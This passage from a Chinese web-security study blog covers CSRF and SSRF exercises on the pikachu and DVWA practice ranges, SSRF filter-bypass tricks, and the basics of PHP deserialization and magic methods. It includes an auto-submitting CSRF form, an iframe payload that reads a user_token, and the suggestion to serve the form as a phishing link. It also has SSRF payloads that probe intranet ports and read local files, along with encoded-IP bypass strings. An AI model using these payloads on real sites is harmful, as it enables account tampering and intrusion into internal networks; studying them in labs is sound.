class="headerlink" title="CSRF poc生成"></a>CSRF poc生成</h3><p>环境：pikachu靶场 CSRF Get</p><p>工具：burpsuit</p><ol><li>在修改信息时抓包</li><li>在抓到的数据包中，选择 生成CSRF PoC</li></ol><p><img src="/2023/012220963/167.png" alt="167"></p><p><img src="/2023/012220963/168.PNG" alt="168"></p><ol start="3"><li>根据需求，修改包中的数据，将生成的html代码复制到html文件中</li></ol><pre class="line-numbers language-html" data-language="html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>submit<span class="token punctuation">"</span></span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>submit<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>Submit request<span class="token punctuation">"</span></span> <span class="token attr-name">hidden</span> <span class="token punctuation">/></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">></span></span><span class="token script"><span class="token language-javascript">    <span class="token comment">// 加一段js，让它自动执行</span>    window<span class="token punctuation">.</span><span class="token function-variable function">onload</span> <span class="token operator">=</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        document<span class="token punctuation">.</span><span class="token function">getElementById</span><span class="token punctuation">(</span><span class="token string">"submit"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">click</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/2023/012220963/169.PNG" alt="169"></p><ol start="4"><li>访问html，任何方式都可以</li></ol><ul><li>搭建公网服务器，生成链接</li><li>生成钓鱼链接</li></ul><p><img src="/2023/012220963/170.PNG" alt="170"></p><h3 id="dvwa靶场CSRF–high"><a href="#dvwa靶场CSRF–high" class="headerlink" title="dvwa靶场CSRF–high"></a>dvwa靶场CSRF–high</h3><p>获取user_token</p><pre class="line-numbers language-html" data-language="html"><code class="language-html">＜iframe src='../csrf' onload=alert（frames[0].document.getElementsByName('user_token'）[0].value)＞<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>构造链接</p><pre class="line-numbers language-html" data-language="html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>img</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>链接<span class="token punctuation">"</span></span><span class="token punctuation">/></span></span>//token要用上面获取到的<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>p</span><span class="token punctuation">></span></span>404 error<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>p</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h3 id="CSRF-漏洞检测"><a href="#CSRF-漏洞检测" class="headerlink" title="CSRF 漏洞检测"></a>CSRF 漏洞检测</h3><ol><li><p>确定网站的功能，去测试 存在<strong>修改</strong>、<strong>添加</strong>等功能的战</p></li><li><p>CSRF只能通过用户的正规操作进行攻击</p></li><li><p>抓包查看，如果没有token验证，并且不检查referer字段则大概率会出现csrf漏洞</p></li><li><p>构造poc去测试，如果修改信息成功，则存在csrf</p></li></ol><h3 id="CSRF-漏洞防御"><a href="#CSRF-漏洞防御" class="headerlink" title="CSRF 漏洞防御"></a>CSRF 漏洞防御</h3><ul><li><p>在请求地址中添加 token 验证（最有效）</p></li><li><p>验证 HTTP Referer 字段</p></li><li><p>在 HTTP 头中自定义属性并验证</p></li><li><p>使用验证码或者密码确认方式进行</p></li></ul><h2 id="SSRF服务端请求伪造"><a href="#SSRF服务端请求伪造" class="headerlink" title="SSRF服务端请求伪造"></a>SSRF服务端请求伪造</h2><p>SSRF (Server-Side Request Forgery，服务器端请求伪造）是一种由攻击者构造请求，由服务端发起请</p><p>求的安全漏洞。</p><p>一些服务端提供了从其他服务器应用获取数据的功能，但又没有对目标地址做严格过滤与限制，导致攻</p><p>击者可以传入任意的地址来让后端服务器对其发起请求，并返回对该目标地址请求的数据。</p><p><strong>SSRF影响外网访问不了的内网系统。</strong></p><h3 id="SSRF图解"><a href="#SSRF图解" class="headerlink" title="SSRF图解"></a>SSRF图解</h3><p><a href="http://www.xxx.com/a.php?image=http://192.168.0.109/xxx.png">http://www.xxx.com/a.php?image=http://192.168.0.109/xxx.png</a></p><p><img src="/2023/012220963/171.PNG" alt="171"></p><p>正常业务流程：用户访问浏览器，浏览器请求服务器，服务器再从109内网机器去获取资源</p><p>如果服务器对 image参数的链接 校验不完善，我们就可以请求任意的ip、或者是url资源</p><h3 id="SSRF危害"><a href="#SSRF危害" class="headerlink" title="SSRF危害"></a>SSRF危害</h3><ul><li><p>对外网、服务器所在内网、本地进行端口扫描</p></li><li><p>攻击运行在内网或本地的应用程序</p></li><li><p>对内网 WEB 应用进行指纹识别，通过访问默认文件实现 (如：readme文件)</p></li><li><p>攻击内外网的 web 应用，主要是使用 GET 参数就可以实现的攻击 (如：Struts2，SQLi)</p></li><li><p>下载内网资源(利用file协议读取本地文件等)</p></li><li><p>进行跳板</p></li><li><p>无视cdn</p></li><li><p>利用Redis未授权访问，HTTP CRLF注入实现getshell</p></li></ul><h3 id="引发SSRF的函数"><a href="#引发SSRF的函数" class="headerlink" title="引发SSRF的函数"></a>引发SSRF的函数</h3><p><strong>file_get_contents()</strong></p><p>功能：把整个文件读入一个字符串中。</p><p>file_get_contents()支持读取远程文件。</p><p><strong>curl_exec()</strong></p><p>功能：初始化一个cURL会话，设置参数之后调用。</p><p>curl_exec()函数主要就是调用curl。</p><p>curl是一个利用URL语法在命令行下工作的文件传输工具，它可以进行网络请求。</p><p>curl支持很多协议，有FTP, FTPS, HTTP, HTTPS, GOPHER, TELNET, DICT, FILE以及LDAP。</p><p><strong>fsockopen()</strong></p><p>功能：打开一个网络连接或者一个Unix套接字连接。</p><p>socket是套接字，也就是发起网络请求，同样也能够进行SSRF攻击。</p><h3 id="SSRF漏洞攻击"><a href="#SSRF漏洞攻击" class="headerlink" title="SSRF漏洞攻击"></a>SSRF漏洞攻击</h3><h4 id="curl"><a href="#curl" class="headerlink" title="curl"></a>curl</h4><p>环境：pikachu靶场 SSRF Curl</p><p>工具：burpsuit</p><p>开启一台内网 linux服务器</p><ol><li>正常访问网站</li><li>修改链接为 <a href="http://www.baidu.com/">www.baidu.com</a></li></ol><p><img src="/2023/012220963/172.PNG" alt="172"></p><ol start="3"><li>修改链接为内网linux的ip</li></ol><p>​    <a href="http://192.168.111.136/">http://192.168.111.136</a></p><ol start="4"><li>加上端口号，实现了内网服务探测</li></ol><p>​    <a href="http://192.168.111.136：22">http://192.168.111.136：22</a></p><p><img src="/2023/012220963/BLOG/hexoblog\source_posts\Web安全基础\173.PNG" alt="173"></p><p>​    同样可以使用dict协议实现</p><p>​    dict://127.0.0.1:3306</p><p><img src="/2023/012220963/174.PNG" alt="174"></p><h4 id="file-get-contents"><a href="#file-get-contents" class="headerlink" title="file_get_contents"></a>file_get_contents</h4><p>环境：pikachu靶场 SSRF fgc</p><p>工具：burpsuit</p><ol><li>正常访问网站</li><li>修改链接为<a href="http://www.baidu.com/">http://www.baidu.com</a></li></ol><p><img src="/2023/012220963/175.PNG" alt="175"></p><ol start="3"><li>修改链接为 php://filter/read=convert.base64-encode/resource=ssrf.php</li></ol><p><img src="/2023/012220963/176.PNG" alt="176"></p><ol start="4"><li>修改链接为file://D:/a.txt</li></ol><p><img src="/2023/012220963/177.PNG" alt="177"></p><h3 id="SSRF查找"><a href="#SSRF查找" class="headerlink" title="SSRF查找"></a>SSRF查找</h3><p><strong>从web功能查找</strong></p><p>存在以下功能的网站，有可能存在SSRF漏洞</p><ul><li><p>图片上传、下载功能，可能通过url参数访问资源</p></li><li><p>收藏功能，可能会包含收藏的目标地址</p></li><li><p>分享功能，可能会包含分享网站的目标地址</p></li><li><p>API接口，可能会包含下面的参数</p></li></ul><p><strong>从url中查找</strong></p><p>url中存在以下关键字，有可能存在SSRF漏洞</p><ul><li><p>share</p></li><li><p>wap</p></li><li><p>url</p></li><li><p>link</p></li><li><p>src</p></li><li><p>source</p></li><li><p>target</p></li><li><p>u</p></li><li><p>3g</p></li><li><p>display</p></li><li><p>domain</p></li><li><p>sourceURL</p></li><li><p>imageURL</p></li></ul><h3 id="SSRF绕过"><a href="#SSRF绕过" class="headerlink" title="SSRF绕过"></a>SSRF绕过</h3><h4 id="利用-1"><a href="#利用-1" class="headerlink" title="利用[::]"></a>利用[::]</h4><p>利用[::]绕过localhost</p><p>http://[::]:80/ &gt;&gt;&gt; <a href="http://127.0.0.1/">http://127.0.0.1</a></p><h4 id="利用-2"><a href="#利用-2" class="headerlink" title="利用@"></a>利用@</h4><p><a href="http://example.com@127.0.0.1/">http://example.com@127.0.0.1</a></p><h4 id="使用短链接"><a href="#使用短链接" class="headerlink" title="使用短链接"></a>使用短链接</h4><p><a href="https://dwz.cn/console/operation">https://dwz.cn/console/operation</a></p><h4 id="利用DNS解析"><a href="#利用DNS解析" class="headerlink" title="利用DNS解析"></a>利用DNS解析</h4><p>在域名控制台中添加A记录，解析到127.0.0.1</p><h4 id="利用Enclosed-alphanumerics"><a href="#利用Enclosed-alphanumerics" class="headerlink" title="利用Enclosed alphanumerics"></a>利用Enclosed alphanumerics</h4><pre class="line-numbers language-PHP" data-language="PHP"><code class="language-PHP">利用Enclosed alphanumericsⓔⓧⓐⓜⓟⓛⓔ.ⓒⓞⓜ &gt;&gt;&gt; example.comList:① ② ③ ④ ⑤ ⑥ ⑦ ⑧ ⑨ ⑩ ⑪ ⑫ ⑬ ⑭ ⑮ ⑯ ⑰ ⑱ ⑲ ⑳⑴ ⑵ ⑶ ⑷ ⑸ ⑹ ⑺ ⑻ ⑼ ⑽ ⑾ ⑿ ⒀ ⒁ ⒂ ⒃ ⒄ ⒅ ⒆ ⒇⒈ ⒉ ⒊ ⒋ ⒌ ⒍ ⒎ ⒏ ⒐ ⒑ ⒒ ⒓ ⒔ ⒕ ⒖ ⒗ ⒘ ⒙ ⒚ ⒛⒜ ⒝ ⒞ ⒟ ⒠ ⒡ ⒢ ⒣ ⒤ ⒥ ⒦ ⒧ ⒨ ⒩ ⒪ ⒫ ⒬ ⒭ ⒮ ⒯ ⒰ ⒱ ⒲ ⒳ ⒴ ⒵Ⓐ Ⓑ Ⓒ Ⓓ Ⓔ Ⓕ Ⓖ Ⓗ Ⓘ Ⓙ Ⓚ Ⓛ Ⓜ Ⓝ Ⓞ Ⓟ Ⓠ Ⓡ Ⓢ Ⓣ Ⓤ Ⓥ Ⓦ Ⓧ Ⓨ Ⓩⓐ ⓑ ⓒ ⓓ ⓔ ⓕ ⓖ ⓗ ⓘ ⓙ ⓚ ⓛ ⓜ ⓝ ⓞ ⓟ ⓠ ⓡ ⓢ ⓣ ⓤ ⓥ ⓦ ⓧ ⓨ ⓩ⓪ ⓫ ⓬ ⓭ ⓮ ⓯ ⓰ ⓱ ⓲ ⓳ ⓴⓵ ⓶ ⓷ ⓸ ⓹ ⓺ ⓻ ⓼ ⓽ ⓾ ⓿<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>①②⑦.⓪.⓪.① = 127.0.0.1</p><pre class="line-numbers language-URL" data-language="URL"><code class="language-URL">http:&#x2F;&#x2F;①②⑦.⓪.⓪.①<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="进制转换"><a href="#进制转换" class="headerlink" title="进制转换"></a>进制转换</h4><p>ipv4可以进行进制转换</p><p>禁止可以是十六进制，八进制等。</p><p>例如：127.0.0.1 &gt;&gt;&gt; 2130706433</p><p>首先把这四段数字给分别转成16进制，结果：7F 00 00 01</p><p>然后把 7F 00 00 01 这十六进制一起转换成8进制</p><p>记得访问的时候加0表示使用八进制(可以是一个0也可以是多个0 跟XSS中多加几个0来绕过过滤一样)，</p><p>十六进制加0x</p><p><a href="http://127.0.0.1/">http://127.0.0.1</a></p><p><a href="http://127.0.0.1/">http://2130706433</a></p><p><a href="http://127.0.0.1/">http://0x7F000001</a></p><p><a href="http://127.0.0.1/">http://017700000001</a></p><h4 id="句号绕过"><a href="#句号绕过" class="headerlink" title="句号绕过"></a>句号绕过</h4><p>ip：127。0。0。1 = 127.0.0.1</p><pre class="line-numbers language-HTTP" data-language="HTTP"><code class="language-HTTP">http:&#x2F;&#x2F;127。0。0。1 http:&#x2F;&#x2F;www.baidu。com<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h4 id="组合绕过"><a href="#组合绕过" class="headerlink" title="组合绕过"></a>组合绕过</h4><p>使用以上方法的组合</p><pre class="line-numbers language-HTML" data-language="HTML"><code class="language-HTML">http:&#x2F;&#x2F;①②⑦。⓪。⓪。①<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="SSRF漏洞防御"><a href="#SSRF漏洞防御" class="headerlink" title="SSRF漏洞防御"></a>SSRF漏洞防御</h3><ul><li><p>禁用不需要的协议，仅仅允许http和https请求。可以防止file://、gopher://、ftp://等引起的问题</p></li><li><p>设置url名单或者限制内网ip</p></li><li><p>统一错误信息，防止利用错误信息来判断远端服务器的端口状态</p></li></ul><h2 id="PHP反序列化漏洞"><a href="#PHP反序列化漏洞" class="headerlink" title="PHP反序列化漏洞"></a>PHP反序列化漏洞</h2><p>反序列化漏洞是指用户可控的数据被网站反序列化。</p><p>攻击者能够操纵序列化对象，以便将有害数据传递到应用程序的代码当中。甚至可以用完全不同的类的</p><p>对象替换序列化对象</p><p>许多基于反序列化的攻击是在反序列化完成之前完成的</p><p>不安全的反序列化通常是因为普遍缺乏对反序列化用户可控数据的危险程度的理解。理想情况下，用户</p><p>输入根本不应该被反序列化。</p><p>然而，有时网站所有者认为他们是安全的，因为他们对反序列化数据实施了某种形式的额外检查。这种</p><p>方法通常是无效的，因为几乎不可能实施验证或清理来解释所有可能发生的情况。这些检查也存在根本</p><p>性的缺陷，因为它们依赖于在反序列化后检查数据，在许多情况下，这对于防止攻击为时已晚。</p><p>由于反序列化的对象通常被认为是值得信赖的，因此也可能会出现漏洞。尤其是在使用二进制序列化格</p><p>式的语言时，开发人员可能会认为用户无法有效地读取或操作数据。然而，虽然这可能需要更多的努</p><p>力，但攻击者利用二进制序列化对象的可能性就如同利用基于字符串的格式一样。</p><p>由于现代网站中存在大量依赖项，基于反序列化的攻击也成为可能。一个典型的站点可能会实现许多不</p><p>同的库，每个库也有自己的依赖项。这会创建大量难以安全管理的类和方法。由于攻击者可以创建任何</p><p>这些类的实例，因此很难预测可以对恶意数据调用哪些方法。如果攻击者能够将一系列意外的方法调用</p><p>链接在一起，将数据传递到与初始源完全无关的接收器中，则尤其如此。因此，几乎不可能预测恶意数</p><p>据的流动并堵住每一个潜在的漏洞。</p><p>简而言之，可以说不可能安全地反序列化不受信任的输入。</p><h3 id="初探反序列化漏洞"><a href="#初探反序列化漏洞" class="headerlink" title="初探反序列化漏洞"></a>初探反序列化漏洞</h3><h4 id="什么是反序列化"><a href="#什么是反序列化" class="headerlink" title="什么是反序列化"></a>什么是反序列化</h4><p>序列化（Serialization）是将<strong>对象的状态信息</strong>转换为可以存储或传输的形式的过程。在序列化期间，对</p><p>象将其当前状态写入到临时或持久性存储区。以后，可以通过从存储区中读取或反序列化对象的状态，</p><p><strong>重新创建该对象</strong></p><h5 id="相关函数"><a href="#相关函数" class="headerlink" title="相关函数"></a>相关函数</h5><p><strong>serialize()序列化</strong></p><p>函数用于序列化对象或数组，并<strong>返回一个字符串</strong>。序列化对象后，可以很方便的将它传递给其他需要它</p><p>的地方，且其类型和结构不会改变。如果想要将已序列化的字符串变回 PHP 的值，可使用 unserialize()</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token keyword type-declaration">string</span> <span class="token function">serialize</span> <span class="token punctuation">(</span> <span class="token keyword type-hint">mixed</span> <span class="token variable">$value</span> <span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><strong>unserialize()反序列化</strong></p><p>unserialize() 函数用于将通过 serialize() 函数序列化后的对象或数组进行反序列化，并<strong>返回原始的对象</strong></p><p><strong>结构</strong>。</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token function">unserialize</span> <span class="token punctuation">(</span> <span class="token keyword type-hint">string</span> <span class="token variable">$str</span> <span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><strong>PHP序列化后的基本类型表达</strong></p><p><img src="/2023/012220963/178.PNG" alt="178"></p><h5 id="简单代码实例"><a href="#简单代码实例" class="headerlink" title="简单代码实例"></a>简单代码实例</h5><p><strong>php运行环境准备</strong></p><ul><li>将php目录添加到环境变量中</li></ul><p><strong>serialize()</strong></p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token comment">// 反序列化一个字符串</span><span class="token variable">$str1</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"abcdefg"</span><span class="token punctuation">;</span><span class="token variable">$str2</span> <span class="token operator">=</span> <span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$str1</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token variable">$str2</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token string double-quoted-string">"\n"</span><span class="token punctuation">;</span><span class="token comment">// 反序列化一个数组</span><span class="token variable">$arr1</span> <span class="token operator">=</span><span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"aaa"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"bbbb"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"ccccc"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$arr2</span> <span class="token operator">=</span> <span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$arr1</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token variable">$arr2</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token string double-quoted-string">"\n"</span><span class="token punctuation">;</span><span class="token comment">// 创建一个类</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">myClass</span> <span class="token punctuation">&#123;</span><span class="token keyword">var</span> <span class="token variable">$var1</span><span class="token punctuation">;</span><span class="token keyword">var</span> <span class="token variable">$var2</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"class1"</span><span class="token punctuation">;</span><span class="token keyword">function</span> <span class="token function-definition function">myfunc</span> <span class="token punctuation">(</span><span class="token variable">$arg1</span><span class="token punctuation">,</span> <span class="token variable">$arg2</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token keyword">echo</span> <span class="token string double-quoted-string">"hello"</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token comment">// new一个对象</span><span class="token variable">$obj1</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">myClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// 反序列化一个对象</span><span class="token variable">$obj2</span> <span class="token operator">=</span> <span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$obj1</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token variable">$obj2</span><span class="token punctuation">;</span><span class="token comment">// 序列化只会序列化属性，不会序列化方法</span><span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>unserialize()</strong></p><pre class="line-numbers language-php" data-language="php"><code class="language-php">s:7:"abcdefg";a:3:&#123;i:0;s:3:"aaa";i:1;s:4:"bbbb";i:2;s:5:"ccccc";&#125;O:7:"myClass":2:&#123;s:4:"var1";N;s:4:"var2";s:6:"class1";&#125;<span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token variable">$str1</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'s:7:"abcdefg";'</span><span class="token punctuation">;</span><span class="token variable">$str2</span> <span class="token operator">=</span> <span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$str1</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token variable">$str2</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token string double-quoted-string">"\n"</span><span class="token punctuation">;</span><span class="token variable">$arr1</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'a:3:&#123;i:0;s:3:"aaa";i:1;s:4:"bbbb";i:2;s:5:"ccccc";&#125;'</span><span class="token punctuation">;</span><span class="token variable">$arr2</span> <span class="token operator">=</span> <span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$arr1</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token variable">$arr2</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token string double-quoted-string">"\n"</span><span class="token punctuation">;</span><span class="token variable">$obj1</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'O:7:"myClass":3:&#123;s:4:"var1";N;s:4:"var2";s:6:"class1";s:4:"var3";i:123;&#125;'</span><span class="token punctuation">;</span><span class="token variable">$obj2</span> <span class="token operator">=</span> <span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$obj1</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token variable">$obj2</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token string double-quoted-string">"\n"</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="为什么会产生反序列化漏洞"><a href="#为什么会产生反序列化漏洞" class="headerlink" title="为什么会产生反序列化漏洞"></a>为什么会产生反序列化漏洞</h4><h5 id="魔术方法触发反序列化"><a href="#魔术方法触发反序列化" class="headerlink" title="魔术方法触发反序列化"></a>魔术方法触发反序列化</h5><p>PHP将所有以（两个下划线）开头的类方法保留为魔术方法。所以在定义类方法时，除了上述魔术方</p><p>法，建议不要以 “ <strong>__</strong> “ 为前缀。</p><p>常见的魔术方法：</p><p> __construct() 当一个对象创建的时候被调用</p><p> __destruct() 当一个对象销毁的时候被调用</p><p> __toString() 当一个对象被当作字符串使用的时候被调用</p><p> __invoke 当尝试以调用函数的方式调用一个对象时，会被调用</p><p> __sleep() 当对象在被序列化之前运行</p><p> __wakeup() 当在被反序列化之后调用</p><p> __get() 访问私有变量或不存在的变量均会触发</p><p> __set() 给私有变量或不存在的变量赋值时，会触发</p><p> __unset 对私有变量或不存在的变量调用unset时，会触发</p><p> __call 在对象中调用一个不可访问方法时，会被调用</p><p>更多的魔术方法：<a href="https://www.php.net/manual/zh/language.oop5.magic.php">https://www.php.net/manual/zh/language.oop5.magic.php</a></p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">myClass</span><span class="token punctuation">&#123;</span><span class="token keyword">public</span> <span class="token variable">$name</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"hello"</span><span class="token punctuation">;</span><span class="token keyword">private</span> <span class="token variable">$age</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"20"</span><span class="token punctuation">;</span><span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">age</span> <span class="token operator">=</span> <span class="token variable">$age</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">name</span><span class="token operator">.</span><span class="token string double-quoted-string">",I'm __construct().\n"</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">function</span> <span class="token function-definition function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">echo</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">name</span><span class="token operator">.</span><span class="token string double-quoted-string">",I'm __destruct().\n"</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">function</span> <span class="token function-definition function">__toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">echo</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">name</span><span class="token operator">.</span><span class="token string double-quoted-string">",I'm __toString()."</span><span class="token punctuation">;</span><span class="token keyword">return</span> <span class="token string double-quoted-string">"111\n"</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">function</span> <span class="token function-definition function">__invoke</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">echo</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">name</span><span class="token operator">.</span><span class="token string double-quoted-string">",I'm __invoke().\n"</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">function</span> <span class="token function-definition function">__sleep</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">echo</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">name</span><span class="token operator">.</span><span class="token string double-quoted-string">",I'm __sleep().\n"</span><span class="token punctuation">;</span><span class="token keyword">return</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'name'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">function</span> <span class="token function-definition function">__wakeup</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">echo</span> <span class="token string double-quoted-string">"hello,I'm __wakeup().\n"</span><span class="token punctuation">;</span><span class="token keyword">return</span> <span class="token number">123123</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">function</span> <span class="token function-definition function">__get</span><span class="token punctuation">(</span><span class="token variable">$arg1</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">echo</span> <span class="token string double-quoted-string">"hello,I'm __get().\n"</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">function</span> <span class="token function-definition function">__set</span><span class="token punctuation">(</span><span class="token variable">$arg1</span><span class="token punctuation">,</span> <span class="token variable">$value</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">echo</span> <span class="token string double-quoted-string">"hello,I'm __set().\n"</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">function</span> <span class="token function-definition function">__unset</span><span class="token punctuation">(</span><span class="token variable">$name</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">echo</span> <span class="token string double-quoted-string">"hello,I'm __unset().\n"</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">function</span> <span class="token function-definition function">__call</span><span class="token punctuation">(</span><span class="token variable">$name</span><span class="token punctuation">,</span> <span class="token variable">$value</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">echo</span> <span class="token string double-quoted-string">"hello,I'm __call().\n"</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">private</span> <span class="token keyword">function</span> <span class="token function-definition function">hidden</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token comment">// 触发 __construct()</span><span class="token variable">$obj</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">myClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// 触发 __toString()</span><span class="token keyword">echo</span> <span class="token variable">$obj</span><span class="token punctuation">;</span><span class="token comment">// 触发 __invoke()</span><span class="token variable">$obj</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// 触发 __sleep()</span><span class="token variable">$str1</span> <span class="token operator">=</span> <span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$obj</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// 触发 __wakeup()</span><span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$str1</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// 触发 __get()</span><span class="token keyword">echo</span> <span class="token variable">$obj</span><span class="token operator">-></span><span class="token property">age</span><span class="token punctuation">;</span><span class="token comment">// 触发 __set()</span><span 